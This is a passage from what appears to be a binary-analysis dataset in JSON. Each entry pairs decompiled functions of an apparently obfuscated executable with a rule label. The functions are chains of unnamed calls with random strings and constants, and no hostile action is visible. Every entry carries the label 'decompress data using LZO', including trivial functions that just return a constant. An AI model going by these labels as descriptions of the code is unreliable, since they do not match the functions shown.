fcn.004b21e0(\"khfboqyexhgtefolyvzzshlxycgiocowekgmvcrgrnnvv\", &var_24dh);\n    fcn.00483110();\n    fcn.004b21e0(\"bythuvakgmbextbeziacgqqlyodjjkdaxaipbxcgehpsslmyqgucn\", &var_231h);\n    fcn.00483110();\n    fcn.004b21e0(\"zqfqbzkxmbzgyivcdddenpzaawjeieskbtprzkmvsouuncksklqvoieichvugjwouc\", &var_215h);\n    fcn.004049cc(*0x519598, *0x519598 >> 0x20, *0x519590, *0x519590 >> 0x20, &var_231h + 1, 0x66a, 0x1446, &var_24dh + 1\n                 , &var_269h + 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00404a9a(0x719, *0x5195b8, *0x5195b8 >> 0x20, 0xa9d, *0x5195b0, *0x5195b0 >> 0x20, *0x5195a8, *0x5195a8 >> 0x20\n                 , 0x647, *0x5195a0, *0x5195a0 >> 0x20);\n    uVar1 = param_1;\n    fcn.00404b20();\n    fcn.004b2800();\n    fcn.00483110();\n    fcn.004b21e0(\"nzvpvpnhytbvzixw\", &var_1e1h, uVar1);\n    fcn.00404b9a(*0x5195c8, *0x5195c8 >> 0x20, 0x127f, *0x5195c0, *0x5195c0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"rsghcfpkgqtwzxrfvwdpykwrxucdrypcslvsbwnhvxgvkvfobknazulrzczsfrkvcbabmn\", &var_1c5h);\n    fcn.00483110();\n    pcVar3 = \"orwdqltrrcfjtpheh\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"rmxszbnntamczcvxccjndubvstghykfzhrgagkwlxcbw\", &var_18dh, pcVar3);\n    fcn.00404de8(0xcbf, 0, &var_1a9h + 1, *0x5195d0, *0x5195d0 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040530a(1, 0x74, *0x5195d8, *0x5195d8 >> 0x20);\n    fcn.004038bc(*0x519600, *0x519600 >> 0x20, *0x5195f8, *0x5195f8 >> 0x20, *0x5195f0, *0x5195f0 >> 0x20, *0x5195e8, \n                 *0x5195e8 >> 0x20, *0x5195e0, *0x5195e0 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"aofmrevppwfyakamvdtebotbuoxrwgnlfxdsxpwqlytgbfz\", &var_171h);\n    fcn.00483110();\n    fcn.004b21e0(\"tkkodawkbtnnqbjmsggszxtxdqphbgqnyngoxraedbttkmsokgkgorr\", &var_155h);\n    fcn.0040398a(0, 0x1227, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    pcVar3 = \"jugopfgauxdyhvswmkbegjjt\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"dwmtbefgrlfccekidgpttwnjcwwunowbgaqnbpuigup\", &var_11dh, pcVar3);\n    fcn.00403a3c(0, 1, 0, *0x519610, *0x519610 >> 0x20, &var_139h + 1, 0x13bc, &var_155h + 1, 0x602, *0x519608, \n                 *0x519608 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00403aaa(*0x519628, *0x519628 >> 0x20, *0x519620, *0x519620 >> 0x20, *0x519618, *0x519618 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"fouawierajqhggqlndrtymtyhosbfdniucdogdwgqpmyqbijlbabfhkkivhefdswr\", &var_101h);\n    fcn.00483110();\n    fcn.004b21e0(\"spggdwtirkogoiisxjrgaekrxfqsurwrjgogafdwsiljklubsvaylksjylpzvwyhskplei\", &var_e5h);\n    fcn.00483110();\n    fcn.004b21e0(\"ixtstsnsnpcwpqs\", &var_c9h);\n    fcn.00483110();\n    fcn.004b21e0(\"lajilpypqhjqlqioxryldxohsyrnamyhzenbsygaqbijsiooebosbwyclez\", &var_adh);\n    fcn.00403ba8(0x10d, &var_c9h + 1, &var_e5h + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"erzxwcihxcpcyxhdcwdjosvmhrdpkaxokuesedjhmdxsljaxtebxbnf\", &var_79h);\n    fcn.00483110();\n    fcn.004b21e0(\"vapswqaekyfvxlys\", &var_5dh);\n    fcn.00403bf2(param_1, &var_79h + 1, 0x2fb, &var_94h);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"avapcblrcmofjccpnlmnngzkikxxdhmcwzdgkzaihindlnptieyzaljshwxnoxdtsfgjeekrhwx\", &var_41h);\n    iVar2 = &var_5dh + 1;\n    uVar1 = 1;\n    fcn.00404044(1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tmhtttjxcdbpov\", &var_25h, uVar1, iVar2);\n    fcn.0040406a(&var_41h + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00404242(&var_25h + 1, *0x519638, *0x519638 >> 0x20, *0x519630, *0x519630 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 3578
    },
    "0040b620": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0040b620(void)\n\n{\n    uint var_4h;\n    \n    return 0x87d1;\n}\n",
        "token_count": 30
    },
    "0040b632": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0040b632(uint param_1)\n\n{\n    uint in_stack_fffffd30;\n    ulong uVar1;\n    uint var_24ch;\n    uint var_248h;\n    uint var_230h;\n    uint var_215h;\n    uint var_1fch;\n    uint var_1e1h;\n    uint var_1c5h;\n    uint var_1a9h;\n    uint var_18dh;\n    uint var_171h;\n    uint var_155h;\n    uint var_139h;\n    uint var_11dh;\n    uint var_101h;\n    uint var_e5h;\n    uint var_c9h;\n    uint var_adh;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_40h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"evigzxbakbozpgqfvbkmywqvyrgumrcnltxbbretstkoazvmlsptmcvesetuuxpzbfpqvyo\", &var_215h);\n    fcn.0040aa0e(param_1, 0, *0x521fa8, *0x521fa8 >> 0x20, 0xde, *0x521fa0, *0x521fa0 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar1 = CONCAT44(0x40b751, in_stack_fffffd30);\n    fcn.004b21e0(\"vajcxgsqxyipxsecgartmshgschnrmnomglykvssurnwxjszkyoefgwknjzsakcypopezujtyhzfjppmsp\", &var_1e1h);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"vxobghcgtmyhfezxlvfbvksjrdfyyodjaauefnl\", &var_1c5h);\n    fcn.0040ad98(param_1, &var_1e1h + 1, *0x521fc8, *0x521fc8 >> 0x20, *0x521fc0, *0x521fc0 >> 0x20, *0x521fb8, \n                 *0x521fb8 >> 0x20, *0x521fb0, *0x521fb0 >> 0x20, 0x542, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"saqruxbgmqtgptsskkntyimyzijedqfbruvqebhyqykbvrkijspctptbiejnwgju\", &var_1a9h);\n    fcn.00483110();\n    fcn.004b21e0(\"lazmtbksrxfgmzdcbtdzftsktlbsdjcdudoihycyrfwweoepylrepcffimcigxigihsdzvnd\", &var_18dh);\n    fcn.0040b10c(1, &var_1a9h + 1, 1, &var_1c5h + 1, *0x521fd8, *0x521fd8 >> 0x20, 0, 0x3f, *0x521fd0, *0x521fd0 >> 0x20\n                );\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ybpeehtkazjmgdviubiaegjagzlqqwkctesvzuecugdsnfgkobsppbugqtpvvqdnzffuttxaofqns\", &var_171h);\n    fcn.00483110();\n    fcn.004b21e0(\"zhtetctvrrxzaiktqsmukoisjuuyxbslbrmycrbfqpejaegqszlabalitndvktwtqzbuahrforwjbloikubmi\", &var_155h);\n    fcn.0040b598(0x949, 0, &var_171h + 1, &var_18dh + 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"zvokuehrwolgltzfwaqbuoqqdptvvxpjptsv\", &var_139h);\n    fcn.00483110();\n    fcn.004b21e0(\"umfcegvdykebwcpjcpgdsrjkuwwhtrtxebcupaapdfubytrvdgiavqntddrbwdzceucleocjmanak\", &var_11dh);\n    fcn.00483110();\n    fcn.004b21e0(\"gowjarzuuwqwdvxtxvoxnpsntpkwatuvmegqtkskbaoftqknewkwhjmcqsrhlahrcndfeygoxcweboahwjjpl\", &var_101h);\n    fcn.0040b5da(&var_11dh + 1, 0x18c5, &var_139h + 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040b5f4(0x155, 0xc91, *0x521fe0, *0x521fe0 >> 0x20, 0);\n    fcn.00483110();\n    fcn.004b21e0(\"bpicifsghpeatgvbboolymvjsjjoiqljvjtxgpkclmyunlxwdodydkpbbifleomrdrj\", &var_e5h);\n    fcn.00483110();\n    fcn.004b21e0(\"diihfmbbgqftxxykbqaweqiuvypeataclqvbbuluegcstrzzbekwhftrsxvfnnpvusgqcse\", &var_c9h);\n    fcn.0040b620(&var_e5h + 1, &var_101h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"poeeccspg\", &var_adh);\n    fcn.00483110();\n    fcn.004b21e0(\"gcwlxeznipmq\", &var_91h);\n    fcn.00483110();\n    fcn.004b21e0(\"owyjeegtlbvbmafjeiasqtakzxpjgynuseohnnfgsarlseaceshaypvehagasfavpnccsltzelpfxsdkjzqitxqu\", &var_75h);\n    fcn.0040a4f4(0x2fd, 0, &var_91h + 1, 0, *0x521ff0, *0x521ff0 >> 0x20, &var_adh + 1, &var_c9h + 1, *0x521fe8, \n                 *0x521fe8 >> 0x20, 0x3d6, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ussyrfyzziokttowumxypgydexwdzsdejcoemulurnewklmfudsmmxfaauzvptnczybedniocpxgbyulzotbvryeiz\", &var_59h)\n    ;\n    fcn.0040a80e(*0x521ff8, *0x521ff8 >> 0x20, 0x80a, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040a856(0xf4f);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0040a308(param_1, *0x522008, *0x522008 >> 0x20, 0x9ca, &var_40h, *0x522000, *0x522000 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0040a4c4(0x11a9, *0x522010, *0x522010 >> 0x20, 0x5a2, &var_25h + 1, 0, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 2265
    },
    "0040f71a": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0040f71a(uint param_1)\n\n{\n    uint var_20ch;\n    uint var_208h;\n    uint var_1f0h;\n    uint var_1d8h;\n    uint var_1bdh;\n    uint var_1a1h;\n    uint var_185h;\n    uint var_16ch;\n    uint var_151h;\n    uint var_135h;\n    uint var_119h;\n    uint var_fdh;\n    uint var_e1h;\n    uint var_c8h;\n    uint var_adh;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_40h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.0040f2ac(0, 0xa55, *0x522258, *0x522258 >> 0x20, 0);\n    fcn.0040f2f0(param_1, 0xae9);\n    fcn.004b2800();\n    fcn.00483110();\n    fcn.004b21e0(\"cumzlwlfdjvmmvptaw\", &var_1bdh);\n    fcn.00483110();\n    fcn.004b21e0(\"wsrrxmyctyvkxzfljjkxzsievtnllumggcosyharmfnzopkwtsrp\", &var_1a1h);\n    fcn.0040f3e2(param_1, &var_1bdh + 1, &var_1d8h, 0, 1, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"jszqajgrkaqnvnkbpdqtpqtgojiuvilkbbikfjdlsmtwydc\", &var_185h);\n    fcn.0040f496(&var_1a1h + 1, 0, 0x329, 0x47a, 1, *0x522260, *0x522260 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"pdqtqguzwdagqyctztqdprodilskoourlmxsdivhfkarw\", &var_151h);\n    fcn.00483110();\n    fcn.004b21e0(\"ygkwwqjryzjtmymrxrmjggeycfqwqczwwjqoghkzmgunamptulgc\", &var_135h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0040f590(param_1, *0x522268, *0x522268 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040f6ca(0x712);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0040f128(&var_119h + 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040f1b4(0x1a5c, 0xafa, 0x8bf, *0x522270, *0x522270 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"mecjlptmmsilzkaygnnygcwcyofjjzlldistzfrhqsnfmvnm\", &var_e1h);\n    fcn.0040e308(*0x522288, *0x522288 >> 0x20, 0x172b, 0x55d, &var_fdh + 1, *0x522280, *0x522280 >> 0x20, 0, *0x522278, \n                 *0x522278 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040e35a();\n    fcn.0040e374(0);\n    fcn.00483110();\n    fcn.004b21e0(\"tuddexekbpknkccybplcqdvtyetbgthhxmdmyyrwxuhhdumcnmpdw\", &var_adh);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0040e3a6(param_1, *0x5222b0, *0x5222b0 >> 0x20, 0xbec, *0x5222a8, *0x5222a8 >> 0x20, *0x5222a0, \n                 *0x5222a0 >> 0x20, &var_adh + 1, *0x522298, *0x522298 >> 0x20, &var_c8h, 0xb1c, 0x129f, *0x522290, \n                 *0x522290 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qzfkredknirfeepcjtwfycmtrdvgdcvbxdxsotjdvrvxnyjzlrmclswp\", &var_75h);\n    fcn.0040e484(*0x5222b8, *0x5222b8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040e91a();\n    fcn.0040ea54();\n    fcn.00483110();\n    fcn.004b21e0(\"alqhbmdrsccwnucpvbwvkqqdqnksytszgygmi\", &var_59h);\n    fcn.0040eb00(*0x5222d8, *0x5222d8 >> 0x20, 0x16ca, 0x541, *0x5222d0, *0x5222d0 >> 0x20, *0x5222c8, *0x5222c8 >> 0x20\n                 , 0x1751, &var_75h + 1, 0x176e, *0x5222c0, *0x5222c0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040edda();\n    fcn.00483110();\n    fcn.004b21e0(\"ibugsngoatydvtoivxujswgkgsofmxdddfktlqallnozgqaccydbkcp\", &var_25h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0040f0aa(param_1, *0x5222e8, *0x5222e8 >> 0x20, &var_25h + 1, *0x5222e0, *0x5222e0 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 1824
    },
    "0041006c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.0041006c(void)\n\n{\n    uint var_4h;\n    \n    return 0x8dc6;\n}\n",
        "token_count": 30
    },
    "00410cae": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.00410cae(uint param_1)\n\n{\n    int32_t iVar1;\n    uint in_stack_fffffcc4;\n    ulong uVar2;\n    uint in_stack_fffffd20;\n    uint in_stack_fffffd64;\n    uint var_24ch;\n    uint var_244h;\n    uint var_22ch;\n    uint var_211h;\n    uint var_1f5h;\n    uint var_1d9h;\n    uint var_1bdh;\n    uint var_1a1h;\n    uint var_185h;\n    uint var_16ch;\n    uint var_151h;\n    uint var_135h;\n    uint var_11ch;\n    uint var_101h;\n    uint var_e5h;\n    uint var_c9h;\n    uint var_adh;\n    uint var_91h;\n    uint var_78h;\n    uint var_5dh;\n    uint var_41h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"mzhqmsqlvuxhal\", &var_211h);\n    uVar2 = CONCAT44(0x410d2c, in_stack_fffffd64);\n    fcn.004104da(param_1, &var_22ch);\n    fcn.004b2800(uVar2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qjycnhmvtzyxvcqeaidebkjirufuqgjmekldtdxvh\", &var_1f5h);\n    fcn.00483110();\n    fcn.004b21e0(\"vryflalfhmkkuucpognewncjotwihgctvvdmdevfwtsmpiuatithkebgpbzldyzqvzdmuxaslfsaqrylxkthorxlpimi\", \n                 &var_1d9h);\n    fcn.00483110();\n    fcn.004b21e0(\"tiwukxzbkytvccjsleunyhtdygjdjpguvtgnorjdxjmummirkoxniablbrhgwkdokxnpmbonmyjoskwcxtue\", &var_1bdh);\n    fcn.00410624(&var_1d9h + 1, 0x91c, 0x1600, 0, &var_1f5h + 1, 0x620, *0x522370, *0x522370 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar2 = CONCAT44(0x410eb0, in_stack_fffffd20);\n    fcn.004b21e0(\"sfpfrgqfmbpnvrlyx\", &var_1a1h);\n    fcn.00483110(uVar2);\n    fcn.004b21e0(\"ljvyqonigicudyaxvyzpfsssbxtaoac\", &var_185h);\n    fcn.0041071c(&var_1a1h + 1, 1, *0x522380, *0x522380 >> 0x20, 0x11c2, *0x522378, *0x522378 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004107c6(param_1);\n    fcn.004b2800();\n    fcn.00483110();\n    fcn.004b21e0(\"znnca\", &var_151h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00410af0(&var_151h + 1, *0x522388, *0x522388 >> 0x20, &var_16ch, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar2 = CONCAT44(0x41107c, in_stack_fffffcc4);\n    fcn.004b21e0(\"utbbtpfidhcxjkysajxomxehjtgcixlphyzvbpxsochrwwexdpfzvggrrimopxznhqtbhctqivyc\", &var_101h);\n    fcn.00483110(uVar2);\n    fcn.004b21e0(\"mseoulpd\", &var_e5h);\n    fcn.00483110();\n    fcn.004b21e0(0x51b192, &var_c9h);\n    fcn.00483110();\n    fcn.004b21e0(\"wjcfaxwpcjtdqopgypznbmiyvqjpiciymhapjrdyetcoebwicqkqvhtxxuizigusjdrlyrhidizl\", &var_adh);\n    fcn.0041044c(param_1, 0x5cb, 0, &var_c9h + 1, 0, &var_e5h + 1, *0x522390, *0x522390 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"vfkntvdclwhvvofexbzczjhpwashfgkbsrxuymenrfyztiqzvrhlfskxpfhtqukeceohfwt\", &var_91h);\n    iVar1 = &var_adh + 1;\n    fcn.0041006c();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0041007e(0);\n    fcn.00483110();\n    fcn.004b21e0(\"rzyhsbbxtrhoelkrxzopnbukdfftyd\", &var_5dh, iVar1);\n    fcn.00483110();\n    fcn.004b21e0(\"fegdikaabuycrxbbzzdjnpsarmkchjczpyxebumkkojunipcqficipxtszsezydccoclgvqtfjorz\", &var_41h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0041019c(param_1, *0x5223a8, *0x5223a8 >> 0x20, &var_41h + 1, *0x5223a0, *0x5223a0 >> 0x20, &var_5dh + 1, \n                 *0x522398, *0x522398 >> 0x20, 0x96f, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qexxmruobarxejjdepuqeosez\", &var_9h);\n    fcn.00410280(*0x5223b8, *0x5223b8 >> 0x20, &var_25h + 1, 0x11aa, *0x5223b0, *0x5223b0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 1902
    },
    "004152d6": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.004152d6(uint param_1)\n\n{\n    uint in_stack_fffffbc4;\n    ulong uVar1;\n    char *pcVar2;\n    uint in_stack_fffffc7c;\n    uint var_2bch;\n    uint var_2b4h;\n    uint var_299h;\n    uint var_27dh;\n    uint var_261h;\n    uint var_245h;\n    uint var_229h;\n    uint var_20dh;\n    uint var_1f4h;\n    uint var_1d9h;\n    uint var_1bdh;\n    uint var_1a1h;\n    uint var_185h;\n    uint var_16ch;\n    uint var_154h;\n    uint var_139h;\n    uint var_11dh;\n    uint var_101h;\n    uint var_e8h;\n    uint var_cdh;\n    uint var_b1h;\n    uint var_95h;\n    uint var_79h;\n    uint var_5dh;\n    uint var_41h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.00414724(1, *0x522630, *0x522630 >> 0x20, *0x522628, *0x522628 >> 0x20, *0x522620, *0x522620 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"fyjnfqrnvmudhzusogegqjuuaubwfxoyprmjmnhiqqvziaglu\", &var_299h);\n    fcn.00414838(0x6e, &var_2b4h, 0xf20, 0x86b, *0x522638, *0x522638 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004149e4(0x910);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00414d7c(1, *0x522650, *0x522650 >> 0x20, 1, 0, *0x522648, *0x522648 >> 0x20, *0x522640, *0x522640 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar1 = CONCAT44(0x41547b, in_stack_fffffc7c);\n    fcn.004b21e0(\"toytfflsiyvzxlnfihkwdugqgnmqbwoozcfbqzxpbwwmtjyjjufbniccxfwl\", &var_261h);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"kktasnkhvhhhaooqxawlattuwsbpbc\", &var_245h);\n    fcn.00415106(*0x522678, *0x522678 >> 0x20, *0x522670, *0x522670 >> 0x20, *0x522668, *0x522668 >> 0x20, &var_261h + 1\n                 , *0x522660, *0x522660 >> 0x20, 1, *0x522658, *0x522658 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    pcVar2 = \"yvajmwfzfnywbirzmwucjaambedxgglnzguqjhwrvwybpbdvxpspftyvheypcmignutnzmrpiubythulr\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"ympgwretpvvlzmaafberruubzynlzxyqiltgrrtpzklalbksndbttakhxrgwvkzcxnfescpnqlwndazjcp\", &var_20dh, pcVar2\n                );\n    fcn.00413dd6(*0x522688, *0x522688 >> 0x20, 0x191a, *0x522680, *0x522680 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"jakpsdnfufabbxubqgnv\", &var_1d9h);\n    fcn.00483110();\n    fcn.004b21e0(\"sazpgwrjfaetdcwodepbfeuhkkwjicrjbxijfeyiqmsuweortrvkfxssgcpwevdfexjsqzayjpqjaxuzsmflwtgradcyzwqgutze\"\n                 , &var_1bdh);\n    fcn.00413f80(param_1, 0x1775, 0x75, &var_1d9h + 1, *0x522690, *0x522690 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x51c309, &var_1a1h);\n    fcn.00483110();\n    fcn.004b21e0(\"osdsluxfw\", &var_185h);\n    uVar1 = CONCAT44(0x415784, in_stack_fffffbc4);\n    fcn.004140ca(&var_1a1h + 1, &var_1bdh + 1);\n    fcn.004b2800(uVar1);\n    fcn.00483140();\n    fcn.004b2800(uVar1);\n    fcn.00483140();\n    fcn.0041435a(*0x522698, *0x522698 >> 0x20, 1, 0);\n    fcn.0041438a(param_1, *0x5226a8, *0x5226a8 >> 0x20, *0x5226a0, *0x5226a0 >> 0x20);\n    fcn.004b2800();\n    fcn.00414472(1, 0x34c, 0xa1e, *0x5226b0, *0x5226b0 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"togposhifbsikzqinvppcaoklkrvdmzcaeyfjqofpnlecvutuwifdkehhxbxtqgyojlquysaoh\", &var_139h);\n    fcn.00413430(param_1, &var_154h, 0x2040, 1, 0xf0e, 0x73, 0x50c, 0x580, *0x5226b8, *0x5226b8 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"pqufqpiecllwpxvykgoqiyfpxnvgchatugfnoapbqgzmqlb\", &var_11dh);\n    fcn.0041349e(*0x5226d8, *0x5226d8 >> 0x20, &var_139h + 1, 1, 0x541, *0x5226d0, *0x5226d0 >> 0x20, 0x4e5, *0x5226c8, \n                 *0x5226c8 >> 0x20, 0x764, 1, *0x5226c0, *0x5226c0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.004134f0(&var_11dh + 1, *0x5226e0, *0x5226e0 >> 0x20, 0x1642, 0xd48, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.004136e0(param_1, *0x5226f0, *0x5226f0 >> 0x20, *0x5226e8, *0x5226e8 >> 0x20, &var_cdh + 1, 0, 0x681, 0, 0, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gdmkegacnuaqbmxbrjhrtgdwgbmzhybfcloicaeqwgqyedldctolxftwisleqwicbnuoivlcsrclzawq\", &var_95h);\n    fcn.004137fa(*0x5226f8, *0x5226f8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"zctk\", &var_79h);\n    fcn.00483110();\n    fcn.004b21e0(\"qjgeocvuwjyhvhvviajaxfaytezsebowwigcbdbckvobqycvwfxuyhdxhpyalmbzulrxkp\", &var_5dh);\n    fcn.004138e2(*0x522718, *0x522718 >> 0x20, *0x522710, *0x522710 >> 0x20, &var_79h + 1, *0x522708, *0x522708 >> 0x20\n                 , &var_95h + 1, *0x522700, *0x522700 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00413a60(*0x522720, *0x522720 >> 0x20, 0);\n    fcn.00483110();\n    fcn.004b21e0(\"jzjwjyovmzjjtbarhtwfmfgafrhvueikbgpaohlavxxipjwoyzeyoofsuqfkwpgtxsixncslrjwnunkoav\", &var_41h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00413d96(0xb3e, *0x522738, *0x522738 >> 0x20, *0x522730, *0x522730 >> 0x20, &var_25h + 1, *0x522728, \n                 *0x522728 >> 0x20, &var_41h + 